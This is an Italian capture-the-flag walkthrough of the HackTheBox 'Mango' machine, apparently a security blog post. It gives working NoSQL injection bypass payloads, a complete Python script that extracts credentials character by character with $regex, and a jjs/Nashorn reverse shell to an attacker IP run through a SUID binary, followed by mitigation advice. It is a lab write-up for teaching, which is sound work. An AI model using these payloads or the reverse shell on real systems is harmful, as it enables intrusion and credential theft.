---
title: 'HTB Mango Walkthrough: NoSQL Injection e Privilege Escalation'
slug: htb-mango-walkthrough
description: 'Walkthrough completo HTB Mango: bypass del login con NoSQL injection su MongoDB, estrazione credenziali con $regex e privilege escalation via SUID su jjs.'
image: /htb-mango-walkthrough-nosql-injection.webp
draft: false
date: 2026-09-02T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - nosql-injection
  - mongodb
  - htb-walkthrough
---

# HTB Mango Walkthrough: NoSQL Injection su MongoDB e Privilege Escalation con JJS

Mango è una delle macchine HackTheBox più citate quando si parla di NoSQL injection, e non a caso: è probabilmente il primo box dove un pentester alle prime armi con MongoDB scopre che le tecniche di SQL injection classica non funzionano più così come le conosce. Servono operatori diversi, una sintassi diversa, un modo diverso di pensare alla query.

In questa guida analizziamo l'intera catena di attacco: dalla ricognizione iniziale al bypass dell'autenticazione via NoSQL injection, dall'estrazione delle credenziali fino alla privilege escalation finale sfruttando un binario Java con permessi SUID mal configurati. Lo facciamo scrivendo i nostri strumenti da zero, senza affidarci a tool automatici come NoSQLMap — che oltretutto, essendo fermo a Python 2.7, oggi su Kali aggiornato è quasi impossibile far girare senza rattoppare mezza dozzina di dipendenze morte.

## Ricognizione iniziale

Come sempre, si parte da una scansione delle porte — qui con [`mynmap`](https://github.com/hack-ita/mynmap), il wrapper nmap di Hackita:

```bash
mynmap 10.129.229.185
```

```
# Nmap Scan Report — 10.129.229.185
**Date:** 2026-09-01 19:50:03

## TCP Ports Discovered
| Port | State |
|------|-------|
| 22   | open  |
| 80   | open  |
| 443  | open  |

## Service Detection
| Port    | Service  | Version |
|---------|----------|---------|
| 22/tcp  | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80/tcp  | http     | Apache httpd 2.4.29 |
| 443/tcp | ssl/http | Apache httpd 2.4.29 (Ubuntu) |
```

Dal raw output emergono due dettagli utili: la porta 80 risponde con un secco `403 Forbidden` (niente da vedere lì), mentre il certificato SSL sulla 443 rivela nel campo `commonName` il vero vhost da aggiungere a `/etc/hosts`:

```
ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./...
```

Da lì in poi si lavora su `staging-order.mango.htb`, che restituisce un title diverso ("Mango | Search Base") e apre effettivamente un form di login.

## Da un endpoint dimenticato a un indizio su MongoDB

Girando sull'applicazione principale (`mango.htb`) salta fuori un endpoint interessante: `analytics.php`. Non richiede login e mostra un semplice pannello di reportistica, costruito con una libreria JavaScript di terze parti, **Flexmonster**.

A questo punto, senza sapere ancora nulla su come muoversi, la mossa più naturale è cercare "Flexmonster database" — non tanto per trovare un exploit pronto, quanto per capire con che tipo di stack ci si trova davanti. Flexmonster è un componente per pivot table e reportistica dati: la sua documentazione elenca esplicitamente i backend supportati, e tra questi compare MongoDB.

È un dettaglio piccolo ma che cambia tutto l'approccio: il backend reale dell'applicazione non era relazionale come ci si aspetterebbe di default, ma coerente con un database NoSQL — tanto che, più avanti nella catena d'attacco (dopo l'accesso alla shell), la [porta 27017 di MongoDB](https://hackita.it/articoli/porta-27017-mongodb/) si rivela effettivamente in ascolto sul target. A quel punto, tornando sul form di login del vhost `staging-order.mango.htb`, il sospetto diventa una linea di indagine precisa: se il backend è MongoDB, vale la pena testare payload NoSQL invece che SQL injection classica sul campo di autenticazione.

Questo è un promemoria utile al di là del box specifico: prima di lanciarsi su un form di login con i soliti payload SQLi, vale sempre la pena fare un giro sull'applicazione per capire lo stack tecnologico reale — endpoint dimenticati, librerie di terze parti, messaggi d'errore, header HTTP. Spesso è lì che si trova l'indizio che orienta l'intero attacco.

## SQL injection vs NoSQL injection: perché qui cambia tutto

Prima di lanciarsi sul form di login vale la pena chiarirsi le idee, perché è il punto dove chi viene dalla SQL injection classica si blocca. Se vuoi una guida completa e dedicata solo a questa tecnica, l'abbiamo trattata a parte: [NoSQL Injection: Guida Completa](https://hackita.it/articoli/nosql-injection/).

In un database relazionale (MySQL, PostgreSQL, MSSQL) i dati stanno in tabelle con colonne fisse, e le query sono stringhe di testo SQL. La SQL injection classica funziona rompendo quella stringa con un apice:

```sql
' OR '1'='1
```

MongoDB non è relazionale: i dati stanno in **collection** (l'equivalente delle tabelle) fatte di **document** in stile JSON, con campi che possono variare da un documento all'altro. Le query verso MongoDB non sono testo SQL — sono oggetti/dizionari con operatori propri (`$ne`, `$gt`, `$regex`, `$where`...).

Questo significa che qui non stai rompendo una stringa: stai iniettando direttamente nella **struttura dati** della query. Se il backend costruisce la query prendendo il tuo input senza validarlo, e quell'input può contenere operatori MongoDB invece di semplice testo, puoi cambiare la logica della query allo stesso modo in cui lo faresti con un apice in SQL — solo con sintassi completamente diversa.

## Bypass dell'autenticazione

Il form di login di Mango accetta due campi POST, `username` e `password` (verificalo sempre intercettando la richiesta con [Burp Suite](https://hackita.it/articoli/burp-suite/) — i nomi dei campi cambiano da applicazione ad applicazione, non dare mai per scontato che siano `user`/`pass`).

Il payload di bypass più semplice sfrutta l'operatore `$ne` (not equal):

```
username[$ne]=admin&password[$ne]=x&login=login
```

Tradotto: "trova un utente il cui username sia diverso da 'admin' e la cui password sia diversa da 'x'". Se nel database esiste almeno un documento che soddisfa questa condizione (praticamente sempre vera), l'applicazione ti logga come quell'utente.

In alternativa, se conosci già lo username ma vuoi bypassare solo la password:

```
username=admin&password[$ne]=hackita
```

Il risultato pratico è lo stesso: hai dimostrato che l'endpoint è vulnerabile a NoSQL injection senza aver mai indovinato una password vera. Il redirect di successo (status 302) porta a `/home.php`.

### Un vicolo cieco che riorienta l'attacco

`/home.php` però non contiene nulla di sfruttabile: al massimo un indirizzo email, nessun pannello, nessuna funzionalità che permetta ulteriore azione. Il bypass ha dimostrato la vulnerabilità, ma da solo non porta a un accesso concreto al sistema.

L'unico altro punto di ingresso rimasto sull'host è la porta 22 (SSH), già vista in fase di ricognizione. È qui che entra in gioco il secondo obiettivo: non basta più bypassare l'autenticazione, serve **estrarre le credenziali vere** — con la speranza (concreta, vista quanto spesso capita nella realtà) che lo stesso utente riutilizzi la password anche per l'accesso al sistema via SSH.

## Estrarre username e password con $regex

Il bypass ti fa entrare ma, come appena visto, non porta a nulla di direttamente sfruttabile — serve quindi recuperare le credenziali vere per tentare il riutilizzo su SSH. Qui entra in gioco un secondo operatore: `$regex`.

`$regex` fa match parziale su una stringa. Se costruisci una query come:

```
username[$regex]=^a&password[$ne]=x&login=login
```

Stai chiedendo: "trova uno username che **inizia con** la lettera a". Se il server risponde con un redirect di successo (di solito status 302 verso una pagina protetta), sai che esiste uno username che inizia per "a". Ripeti aggiungendo un carattere alla volta — "ad", "adm", "admi"... — finché nessun carattere produce più match: a quel punto hai ricostruito lo username per intero, un carattere alla volta. È un classico attacco blind, concettualmente identico al blind SQL injection basato su boolean, solo con sintassi MongoDB.

Lo stesso identico procedimento, applicato al campo `password` invece che `username`, ti recupera la password.

### Perché non uno script trovato online, ma uno scritto a mano

Si trovano in giro parecchi one-liner pronti per questo attacco (PayloadsAllTheThings ne ha uno molto citato). Copiarli e lanciarli funziona, ma capire ogni riga vale molto di più sul lungo periodo — soprattutto perché la logica di questo script si riusa identica in qualsiasi altro NoSQL injection futuro, cambia solo l'endpoint e i nomi dei campi.

La struttura minima è:

```python
import requests
import urllib3
import string
import re

urllib3.disable_warnings()

url = "http://staging-order.mango.htb/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def trova_campo(nome_campo, altro_campo_bypass, valore_bypass=""):
    trovato = ""
    while True:
        found = False
        for c in string.printable:
            candidato = trovato + re.escape(c)
            payload = "%s[$regex]=^%s&%s[$ne]=%s&login=login" % (
                nome_campo, candidato, altro_campo_bypass, valore_bypass
            )
            r = requests.post(url, data=payload, headers=headers,
                               verify=False, allow_redirects=False)
            if r.status_code == 302:
                trovato += c
                found = True
                break
        if not found:
            break
    return trovato

username = trova_campo("username", "password")
password = trova_campo("password", "username", username)  # una volta noto lo username, si passa a $ne fisso su di esso

print("Username: %s | Password: %s" % (username, password))
```

Due dettagli tecnici che vale la pena isolare, perché ci si inciampa quasi sempre la prima volta:

**`re.escape(c)`** — `string.printable` include caratteri come `*`, `+`, `.`, `?`, `$` che in una regex hanno un significato speciale (non sono "il carattere letterale", sono comandi). Se la password vera contenesse uno di questi simboli e tu li mandassi al database senza protezione, romperesti la sintassi della regex invece di testarli come carattere normale. `re.escape()` antepone un backslash a questi caratteri prima di inserirli nel payload, così MongoDB li tratta come testo letterale — ma il carattere che accumuli nella variabile Python resta quello "pulito", senza backslash.

**`allow_redirects=False`** — di default `requests` segue automaticamente i redirect HTTP, mostrandoti solo la pagina finale. Qui serve invece vedere il codice di stato grezzo della risposta (302 = login riuscito, altro = fallito), quindi va disattivato esplicitamente.

Un'estensione utile, se sospetti più di un utente nel database: dopo aver trovato uno username completo, escludilo dalla ricerca successiva con un lookahead negativo nella regex (`(?!^admin$)`), e ripeti il ciclo — così enumeri tutti gli utenti presenti, non solo il primo che il database restituisce.

## Da bypass a shell: accesso SSH

L'enumerazione degli username (con lo stesso script, esteso a più utenti come descritto sopra) rivela che nel database non c'è solo `admin`, ma anche un secondo utente, `mango` — con la sua password altrettanto estraibile carattere per carattere. Il passo successivo è verificare il riutilizzo di entrambe le credenziali sulla porta 22, già vista aperta in fase di ricognizione:

```bash
ssh mango@staging-order.mango.htb
```

Funziona: un classico caso di password reuse tra applicazione web e sistema operativo, sempre da controllare prima di proseguire con altre strade più complesse. Da lì, la directory home dell'utente `mango` è vuota, ma ne esiste una seconda per `admin` — e la password già estratta in precedenza per quell'utente funziona anche lì, tramite `su`.

## Privilege escalation: SUID su jjs

Con una shell come `admin`, un controllo dei binari con permessi SUID è il passo successivo obbligato:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Tra i risultati compare qualcosa di insolito:

```
-rwsr-sr-- 1 root admin 11K Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

`jjs` (Java Java Script) è il tool a riga di comando che fa parte del JDK e permette di eseguire codice JavaScript dentro la JVM tramite il motore Nashorn. Sta in `/usr/lib/jvm/.../bin/` perché è parte dell'installazione Java, non ha nulla di anomalo di per sé — l'anomalia è nei permessi: proprietario `root`, gruppo `admin`, e bit SUID+SGID attivi (`s` al posto di `x`). Chiunque appartenga al gruppo `admin` può eseguirlo con i privilegi effettivi di root.

Da JavaScript dentro Nashorn puoi richiamare classi Java native, incluse `java.lang.ProcessBuilder` e `java.lang.Runtime`, che permettono di lanciare processi di sistema. Dato che `jjs` gira come root, anche i processi che lancia da lì ereditano quel privilegio: è esattamente il pattern catalogato su [GTFOBins](https://hackita.it/articoli/gtfobins/) per questo binario.

### La reverse shell

Un dettaglio pratico che vale la pena segnalare: incollare lo script JavaScript riga per riga direttamente nella sessione interattiva di `jjs` spesso causa problemi, perché uno dei comandi (`ProcessBuilder` con shell interattiva) cerca di prendere il controllo del terminale mentre `jjs` lo sta già usando — il processo finisce sospeso (`Stopped`). La soluzione è scrivere l'intero script in un file ed eseguirlo in un unico colpo:

```bash
cat > shell.js << 'EOF'
var host='10.10.14.198';
var port=12345;
var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
var p=new ProcessBuilder('/bin/sh', '-p').redirectErrorStream(true).start();
var Socket = Java.type('java.net.Socket');
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
EOF
jjs shell.js
```

Nota il flag `-p` su `/bin/sh` invece del classico `-i`: dice alla shell di **non abbandonare** i privilegi elevati (l'euid effettivo) nemmeno se differiscono dall'uid reale — condizione necessaria perché, ereditando l'esecuzione da un binario SUID come `jjs`, la shell resti effettivamente root invece di ridursi ai permessi dell'utente che l'ha lanciata.

Con un listener in ascolto sull'attaccante (`nc -lvnp 12345`), ricevi una shell con `uid` reale `admin` ma `euid=0(root)` — sufficiente per leggere la flag finale o, con `dash -p` copiato e reso SUID tramite lo stesso vettore, ottenere una shell root pulita e stabile.

## Rilevamento e mitigazione

Dal lato difensivo, questa catena d'attacco insegna tre cose concrete da controllare in un ambiente di produzione reale:

* **Validazione dell'input verso MongoDB**: qualsiasi input utente che finisce in una query deve essere tipizzato esplicitamente (stringa forzata, non oggetto arbitrario). Librerie come Mongoose permettono di definire schema rigidi che rifiutano automaticamente payload contenenti operatori (`$ne`, `$regex`, `$where`) dove ci si aspetta solo testo.
* **Rate limiting sul login**: un attacco blind carattere per carattere richiede centinaia di richieste. Un rate limit ragionevole sull'endpoint di autenticazione lo rallenta fino a renderlo impraticabile.
* **Audit periodico dei permessi SUID**: `jjs` non dovrebbe avere SUID attivo in nessuno scenario di produzione legittimo — nessuna applicazione ha bisogno che un tool di sviluppo Java giri con privilegi di root. Uno script di controllo periodico (`find / -perm -4000` confrontato con una baseline nota) intercetta configurazioni di questo tipo prima che diventino un vettore di privilege escalation.

## FAQ

**La NoSQL injection funziona solo su MongoDB?**
No. MongoDB è il database NoSQL più diffuso e quello con la superficie di attacco più documentata, ma il concetto si applica a qualsiasi database document-based che supporti query con operatori (CouchDB, ad esempio). Cambia la sintassi specifica degli operatori, non il principio di fondo: input non validato che finisce dentro la struttura della query.

**Perché non usare direttamente NoSQLMap invece di scrivere lo script a mano?**
NoSQLMap è fermo a Python 2.7, ormai a fine vita da anni, e su un sistema aggiornato richiede di rattoppare dipendenze rotte una per una prima di riuscire a lanciarlo. Per un attacco relativamente semplice come questo, uno script scritto su misura è più veloce da adattare, più affidabile, e soprattutto ti costringe a capire davvero il meccanismo invece di limitarti a leggere un output.

**Posso usare Burp Intruder al posto di uno script Python?**
Sì. Marchi con `§§` la posizione del carattere da testare nel payload (`username[$regex]=^a§X§`), gli dai come payload set l'alfabeto completo, e guardi quale risposta ha status code o lunghezza diversa dalle altre. È lo stesso identico ciclo dello script, fatto un giro alla volta tramite interfaccia invece che in automatico.
